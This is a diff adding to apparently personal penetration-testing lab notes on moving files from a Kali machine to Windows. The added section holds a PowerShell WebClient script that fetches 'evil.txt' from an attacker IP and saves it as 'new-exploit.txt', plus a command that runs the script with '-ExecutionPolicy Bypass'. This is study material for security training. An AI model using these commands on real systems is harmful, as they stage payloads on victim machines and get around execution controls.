@@ -70,7 +70,19 @@ We can then run the script with cscript and download files from our Kali machine
 
 **2.  Use PowerShell to transfer files in a non-interactive shell from Kali to Windows and vice versa.**
 
-For more recent versions of Windows a much better approach is to utilize PowerShell. 
+For more recent versions of Windows a much better approach is to utilize PowerShell. We start by screating the script with the following code.
+```
+$webclient = New-Object System.Net.WebClient 
+$url = "http://192.168.119.130:9002/evil.txt" 
+$file = "new-exploit.txt" 
+$webclient.DownloadFile($url,$file) 
+```
+
+This creates the wget.ps1 script. In order to run the script we must first enable the execution of PowerShell scripts. We can do this with the following command, including a few extra flags to set a few other options.
+`powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1`
+And we can see our file has downloaded.
+![[Pasted image 20220720024112.png]]
+
 
 **3.  For PowerShell version 3 and above, which is present by default on Windows 8.1 and Windows 10, the cmdlet [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-6) was added. Try to make use of it in order to perform both upload and download requests to your Kali machine.**
 
